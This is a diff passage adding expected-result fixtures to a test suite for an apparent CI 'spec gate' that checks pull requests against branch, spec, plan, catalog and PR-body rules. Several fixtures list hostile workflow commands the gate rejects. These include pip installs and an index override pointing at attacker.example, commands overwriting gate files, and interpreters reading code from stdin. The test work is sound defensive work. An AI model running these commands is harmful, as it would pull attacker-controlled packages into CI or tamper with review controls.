+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '2df270e829287847a87dcefb991b070a73a9e111cfec2be6a6a25ec3f8c1b626', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: `ed -s scripts/gate/spec_gate.py` writes to or replaces a gate file; the workflows read the gate's files, never write them",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '4ef06eefd035328f101a21ff4909498ad13efdc66b2f778c0eb5ce703d0672c1', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: `echo x | sponge scripts/gate/spec_gate.py` writes to or replaces a gate file; the workflows read the gate's files, never write them",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '96bc9b353600aa4d5bb16d440c427996c967c8d75e9e062cf50d034d92162ba4', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: `sort -o scripts/gate/spec_gate.py lib/model.py` writes to or replaces a gate file; the workflows read the gate's files, never write them",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '0100f6fb300001225ebdacc71c11140659ebcd28b8750380c0e6ead632d3389b', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '9828f7cc8bfa756bcf45bedf9e3eca74d934139155005d11a029768b2f7396c5', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip config set global.index-url https://attacker.example/simple` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '9e1aa4612e18556206af3b808f45942cf62f398e2cf9d565aebb5e71c8947cec', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install https://attacker.example/pyyaml-9.whl` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '09296acb1a55189a798175a00bcb0b413db951e5524ddea42114b5822ac7bce6', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install "pyyaml @ https://attacker.example/x.whl"` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '06d3883bb316e65601f2edbc1e779d2275f894547886a810377bb380bd0f9010', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install git+https://attacker.example/x.git` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'c64ae2665e0e352352c579e1e136ae8a7be1e60cd0d2d58ef36ffd5d5ad4a988', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install -r https://attacker.example/req.txt` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'f1a51df07e7b64ccdb7a9e132d9dbe4f95166fac133c15dbd8989eb702e4769a', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install --index https://attacker.example/simple pyyaml` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '82de11d614d09ca820e31074141efcae795f3fb156d950a72bd4b71003090e4c', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install ./` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '50c974c71710cdb1953fbef55813d0db778a3db739bd29b41d862cc6548d0115', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `pip install lib/` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '83c74f3437e2707b64a90d241c24cf787947dd4b9c0cbd7edd083d4246b6371c', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pytest --junit-xml=scripts/gate/spec_gate.py lib` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'a29236c96786b9541234629fe83f08265751339efe0dda28b40a1b0d7ed6c185', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pytest tests/scripts/test_spec_gate.py -q --log-file=scripts/gate/spec_gate.py` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '2552cbf94eec5b6f6c1fe1560f1663f5d4fecbee19ec7c4af95a96bf094fd2c0', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `pytest -o cache_dir=scripts/gate lib` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'a24eee44ad3fd5189a646e37b4322a4bbdd453d0833f0e6be9bc55dd99f16df7', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'a2814983e4d28fd634f8f9eeaee4434b99b81e1973802bcef8a63d62c591014b', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: the handoff artifact 'proposed-spec-gate' is uploaded or downloaded more than once, or with overwrite; the base's suite receives exactly the proposed gate",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'd175ba7475e68ec6bf03b3cab2b85a7d19848c56a6000a5993d149fdc8b898b4', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: the handoff artifact 'proposed-spec-gate' is uploaded or downloaded more than once, or with overwrite; the base's suite receives exactly the proposed gate",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'f8f5ebcbd717e0c666757d96a4c6e77bfa1f2116157d62a60c9fa91b01eef5f8', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: runs inline code (`git diff --output=`); the gate's workflows run scripts from the tree only, never eval, source or shopt, never extract archives, and run no module but pip, pytest and py_compile; xargs builds a command from its input; git only reads, never with --output; an interpreter never reads its program from stdin; pip installs named packages from the default index",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '6ca00c4f8e044f4906ec4293bea6712abe400619321b8627cb4d8d24315717b1', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: runs inline code (`git log -1 --output`); the gate's workflows run scripts from the tree only, never eval, source or shopt, never extract archives, and run no module but pip, pytest and py_compile; xargs builds a command from its input; git only reads, never with --output; an interpreter never reads its program from stdin; pip installs named packages from the default index",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '302d8b45f18b37bf66671b82c72df98994d8c6b25d8837f9699d9ba769fde9cc', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: runs inline code (`python3 /dev/stdin`); the gate's workflows run scripts from the tree only, never eval, source or shopt, never extract archives, and run no module but pip, pytest and py_compile; xargs builds a command from its input; git only reads, never with --output; an interpreter never reads its program from stdin; pip installs named packages from the default index",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '64e4f5129493622ab1ece2439b8a27f10b36a155900736c00240353a61fd1572', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: runs inline code (`python3 -`); the gate's workflows run scripts from the tree only, never eval, source or shopt, never extract archives, and run no module but pip, pytest and py_compile; xargs builds a command from its input; git only reads, never with --output; an interpreter never reads its program from stdin; pip installs named packages from the default index",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '2de007be1cc3dceaf79d7acf9cb092ce0ed805a49a8e1be0ecfefef72df0c20f', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: runs inline code (`python3 <`); the gate's workflows run scripts from the tree only, never eval, source or shopt, never extract archives, and run no module but pip, pytest and py_compile; xargs builds a command from its input; git only reads, never with --output; an interpreter never reads its program from stdin; pip installs named packages from the default index",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '36e5d371e7289f4581f308aa3ce6655633eaa57ea8ef4e640da5b219191e15b7', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install .` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'f9136700a1b99d4e53b904db5c9eaaf4ff3f28969c9c1eeddf8686b6d7405568', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install -e .` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'f0e29cf259113a33e09fb1961b202b99e0b0ccf92340257c55f72fb33548f967', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install --index-url https://attacker.example/simple pyyaml` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '4e75d72a034ebc56da8f04448f8af4529518833d0f1f5ce5709e928a582b8c39', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `pip install -f "$RUNNER_TEMP" pyyaml` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
+        ((('PR_DRAFT', 'false'), ('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_NUMBER', '42'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/02-FEATURE-CATALOG.md', 'docs/superpowers/plans/2026-09-01-model-decisions.md', 'lib/model.py'), '49feff4fa92fe17bfe5a2fbe0bc56eba2ac1fd106230dd1792d7320dea600e7b', '3b4f7f730d2478256a1a38710b7a61cb46b7e9ef8671a9e7eba514fa781f8e34', 0, (), 1, (' - docs/product/02-FEATURE-CATALOG.md: the FEAT-MODEL-001 Status is struck through; set it or remove it',)),
+        ((('PR_DRAFT', 'false'), ('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_NUMBER', '42'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/02-FEATURE-CATALOG.md', 'docs/superpowers/plans/2026-09-01-model-decisions.md', 'lib/model.py'), '1b74287c059bbe835f60d0594151f46ceb9c13544dab858ca72832072e37b0f5', '3b4f7f730d2478256a1a38710b7a61cb46b7e9ef8671a9e7eba514fa781f8e34', 0, (), 1, (' - docs/product/02-FEATURE-CATALOG.md: the FEAT-MODEL-001 record is unchanged from the base although it already reads {TODAY}; a second PR the same day still updates its record (its PRs, Status or notes)',)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/job.py', 'lib/model.py'), 'a77a698f346e519e510e7b942bc6df78aa28736846ce8bbf40e9e99ab02f6475', '5213b2c7d023b57b4b23cf728859b212fe1f3a34021c4d158f2819010de9d76d', 0, ('$0',), 1, (" - PR body's Capacity section defers Volume (rule 0: no 'future work', 'TBD' or 'follow-up' on a workload's numbers); measure it or write 'n/a: <why>'",)),
+        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/Product-Delivery/SKILL.md',), '51e42f39af313f2ea047d51b3ef11a3dd2f6b6cded8fcccf182df51287ca8b5d', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/Product-Delivery/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/product-delivery-v2/SKILL.md',), 'a11a2ab3e2a2d4a4f2cc57221e1e6730dba9db6c36320a6acbafa7b64560d1d6', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/product-delivery-v2/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/superpowers/other/SKILL.md',), '466dea624bb55131948702ac12d9c6ed3adb4ae4d716f2a15b5765059463aa9c', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/superpowers/other/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/07-MODEL-REGISTRY.md', 'lib/model.py'), 'e88684dab2f6afe29d66a121d34dfa364f71224077bf84e04473592ceacd5238', '3aebeed7c12b17af436a7037ad1c39d973bea27239738d6f75bc0c99cd8c6b92', 0, (), 1, (' - docs/product/07-MODEL-REGISTRY.md: changes line(s) naming MODEL-GAMMA-001, MODEL-MAG-001, which docs/superpowers/specs/2026-09-01-model-decisions.md never names; a feature change edits only the registry rows of the models its spec covers',)),
+    ),
+    'test_html_blocks_in_bodies_registry_prose_and_catalog_columns_are_the_contract': (
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '96f752d6607f644ef7eab211e81657d0727d1be79ad12578f1a959d63a7b62b4', 0, (), 1, (' - PR body must link the spec the plan names: docs/superpowers/specs/2026-09-01-model-decisions.md', ' - PR body must link the plan: docs/superpowers/plans/2026-09-01-model-decisions.md', " - PR body must carry each done_when item as its own '- [ ]' line starting with its text; missing: every model states its decision; the registry test passes")),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '65c8baa4a496a3caa65ca1407e47795d6a1e5389617b49949bfe7799f0f3421f', 0, (), 1, (' - PR body must link the spec the plan names: docs/superpowers/specs/2026-09-01-model-decisions.md', ' - PR body must link the plan: docs/superpowers/plans/2026-09-01-model-decisions.md', " - PR body must carry each done_when item as its own '- [ ]' line starting with its text; missing: every model states its decision; the registry test passes")),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '0a6cd1147282d76b43265fe519d0efeb5f73626c21d3aee1f23a7564c7806420', 0, (), 1, (' - PR body must link the spec the plan names: docs/superpowers/specs/2026-09-01-model-decisions.md', ' - PR body must link the plan: docs/superpowers/plans/2026-09-01-model-decisions.md')),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '9947e3b351cbd018fbd333351b94c302c38f938812e6d1f66ac47b2085277a7b', 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/job.py', 'lib/model.py'), 'a77a698f346e519e510e7b942bc6df78aa28736846ce8bbf40e9e99ab02f6475', '6edd1465439ffec654fc2994d435955be7007c61057746e0d580cb6aa938dde2', 0, ('$0',), 0, ()),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/job.py', 'lib/model.py'), 'a77a698f346e519e510e7b942bc6df78aa28736846ce8bbf40e9e99ab02f6475', 'db154724afcb064d23c17db1b415a0dd87a150e8b68b8554690e584900582bb0', 0, ('$0',), 0, ()),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/07-MODEL-REGISTRY.md', 'lib/model.py'), 'e7401e9717b4fd33a056a7045757b53ec109dc8f1d619405cacae93b3d0610db', '3aebeed7c12b17af436a7037ad1c39d973bea27239738d6f75bc0c99cd8c6b92', 0, (), 1, (" - docs/product/07-MODEL-REGISTRY.md: changes '| DOC-02 | Deferred |', a line naming none of docs/superpowers/specs/2026-09-01-model-decisions.md's models; a feature change edits only the registry rows of the models its spec covers",)),
+        ((('PR_HEAD_REF', 'docs/drop-prs'),), ('docs/product/02-FEATURE-CATALOG.md',), '2aef999a28bf51ccb5634ef6f6d665cb694bbd105261625ea8bff442517d966f', None, 0, (), 1, (" - docs/product/02-FEATURE-CATALOG.md: the table no longer carries the PRs column the close-out reads; the catalog's columns keep their names",)),
+        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/superpowers/vendored-x/SKILL.md',), 'a7e1fca96d9c7d44a6d57d872d794f5fdbee5ca968f41e5b1ae08e4981b9709f', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/superpowers/vendored-x/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/superpowers/vendored-x/SKILL.md',), 'd3ce183eeabf75bf3f709acc659fe82a7f3f4cc7725dad7b10f34f98ba3f408a', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/superpowers/vendored-x/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/superpowers/vendored-x/SKILL.md',), 'f90e0bb46d85b891f8de0a6ca83ff6ffb7609a72c390e7d20e0cee352fe7c85d', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/superpowers/vendored-x/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/superpowers/vendored-x/SKILL.md',), '89b0a70a58834afdf4f3c5be1c91dba9583964ce2b047a732defa9b5027c664f', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/superpowers/vendored-x/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '4fed2f8e8aa58d243f52ebf9f50ee19a9007c4da962decb61b0d972d47860b89', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - partially',)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '258f5ec2aede95eba9c58f7580c4c0bed7a5451dab742cf3fe0a58f3edf68570', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - in progress',)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '8df48b2450d845039912269aa3c4617821ab3e8054d0503bd5835c7e72cf4e55', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - WIP',)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '691506752ad87e7b1be18dec19cb4e30073f06bd33e6ec2ba632dfafdb9ec5ce', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - not fully',)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '32f3139d440fd328cf520d669bbd5181763b1222cd8d1e6fd832895ba2a7986f', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - remaining items tracked separately',)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', 'fb70af04b3b0b1eb21bfb3ab108bbb5207956bab28aac33f2f19791c99ed9fa9', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - later in a follow-up',)),
+        ((('PR_HEAD_REF', 'feature/feat-new-001-x'), ('PR_TITLE', 'FEAT-NEW-001: x')), ('docs/superpowers/plans/2026-09-01-new.md', 'lib/model.py'), '90985baba0859d9f64393e520f1003e1e5a606aeef655e9a99f4ed5afe0b5d32', '2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881', 0, (), 1, (' - FEAT-NEW-001 is not a row in docs/product/02-FEATURE-CATALOG.md at the base branch; a capability is added before the work that uses it', ' - docs/superpowers/plans/2026-09-01-new.md: spec path does not exist: docs/superpowers/specs/2026-09-01-new.md')),
+        ((('PR_HEAD_REF', 'docs/new-spec'),), ('docs/superpowers/specs/2026-09-07-model-later.md',), '82106fab823e8748e1c54da1d2be5575fec0498b5a0aaac2dbb156b70e6bbf10', None, 0, (), 1, (' - docs/superpowers/specs/2026-09-07-model-later.md: a new spec is draft or approved; superseded is what an approved spec becomes',)),
+        ((('PR_HEAD_REF', 'docs/new-spec'),), ('docs/superpowers/specs/2026-09-07-FEAT-MODEL-001 Big Feature.md',), '604d45760388e8fbc1462c37329014efa36a4fdfd2593f67356e3aee1a9fb4ba', None, 0, (), 1, (' - docs/superpowers/specs/2026-09-07-FEAT-MODEL-001 Big Feature.md: a spec is named YYYY-MM-DD-<kebab-slug>.md',)),
+        ((('PR_HEAD_REF', 'docs/new-spec'),), ('docs/superpowers/specs/2026-09-07-model-later.md',), '6ff96921fd925055d0d9a0d492f0b55b57655346568c5136d880a8ccf453c1d2', None, 0, (), 0, ()),
+    ),
+    'test_indented_headings_and_less_indented_fence_closers_render_as_gfm_renders_them': (
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '16632044fd5de028529fcf542cbcd98d1059dd3d200bb99805630bf0981fbb0b', 0, ('$0.01',), 0, ()),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '107ca0eb30689a4fee6c63ff80e493f2de3bb9f5784e90ac7c204a9f6ff8ff83', 0, ('$0.01',), 1, (' - PR body needs a Capacity section: the change touches a workload (gcp/model_job.py)',)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', 'f44bfffaf39bafbf2fe659f5dd4fe6003787f4112a68322c35ac7dc663bad488', 0, ('$0.01',), 0, ()),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '43d919684e64cbf94fa7ac2da96ebe741b5734fd8c1dcad7a36910697a636e5d', 0, ('$0.01',), 1, (' - PR body needs a Capacity section: the change touches a workload (gcp/model_job.py)', ' - PR body must link the spec the plan names: docs/superpowers/specs/2026-09-01-model-decisions.md', ' - PR body must link the plan: docs/superpowers/plans/2026-09-01-model-decisions.md', " - PR body must carry each done_when item as its own '- [ ]' line starting with its text; missing: every model states its decision; the registry test passes")),
+    ),
+    'test_truthy_calls_decorators_yaml_skill_names_canvas_fields_manifest_scripts_and_rendered_status': (
+        ((('PR_HEAD_REF', 'chore/gate-suite'),), ('tests/scripts/test_spec_gate.py',), '5d6f378a1a18f8dd3397ab5506c13f1a7ab485d2544003ed79206b1a549dee11', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - tests/scripts/test_spec_gate.py: uses `test_a: an assertion that cannot fail`; the gate's suites carry no skip markers, collection hooks or exits",)),
